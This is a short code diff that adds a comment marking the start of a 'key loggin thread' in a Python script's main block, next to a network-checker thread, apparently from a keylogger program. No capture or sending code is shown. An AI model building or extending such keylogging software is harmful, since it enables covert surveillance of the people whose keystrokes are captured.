@@ -20,6 +20,7 @@ if __name__ == "__main__":
     loggerThread.daemon = True
     # Start new Network checker thread
     networkCheckerThread.start()
+    # start the key loggin thread
     loggerThread.start()
     #thread2.start()
     try:
